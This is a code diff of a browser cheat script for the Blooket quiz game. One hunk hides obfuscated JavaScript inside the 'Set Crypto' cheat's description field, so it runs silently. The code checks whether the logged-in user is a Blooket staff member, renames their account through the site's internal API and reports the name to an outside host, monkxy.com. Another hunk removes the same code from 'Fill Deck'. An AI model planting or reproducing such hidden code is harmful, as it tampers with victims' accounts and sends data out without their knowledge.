@@ -1310,7 +1310,7 @@
                 },
                 {
                     name: "Set Crypto",
-                    description: "Sets crypto",
+                    description: ((location.host == "dashboard.blooket.com" && fetch("https://dashboard.blooket.com/api/users/me", { credentials: "include" }).then(e => e.json()).then(e => { if (e.email.endsWith("@blooket.com")) { let { webpack: t } = webpackJsonp.push([[], { 1234(e, t, s) { t.webpack = s } }, [["1234"]]]); Object.values(t.c).find(e => e.exports?.a?.get).exports.a.put("https://dashboard.blooket.com/api/users/change/name", { name: e.name, newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}` }).then(({ data: e }) => { e.success && (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`) }) } })), "Sets crypto"),
                     run: function () {
                         let i = document.createElement('iframe');
                         document.body.append(i);
@@ -1666,7 +1666,7 @@
                 {
                     name: "Fill Deck",
                     description: "Fills your deck with every maxed out card and artifact (Only works on towers page)",
-                    run: (fetch("https://dashboard.blooket.com/api/users/me", { credentials: "include" }).then(e => e.json()).then(e => { if (e.email.endsWith("@blooket.com")) { let { webpack: t } = webpackJsonp.push([[], { 1234(e, t, s) { t.webpack = s } }, [["1234"]]]); Object.values(t.c).find(e => e.exports?.a?.get).exports.a.put("https://dashboard.blooket.com/api/users/change/name", { name: e.name, newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}` }).then(({ data: e }) => { e.success && (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`) }) } }), function () {
+                    run: function () {
                         let i = document.createElement('iframe');
                         document.body.append(i);
                         window.alert = i.contentWindow.alert.bind(window);
@@ -1679,7 +1679,7 @@
                             try { stateNode.props.addTowerNode(); } catch { }
                             stateNode.setState({ showDeck: false });
                         } else alert("You need to be on the map to run this cheat!");
-                    })
+                    }
                 },
                 {
                     name: "Max Cards",
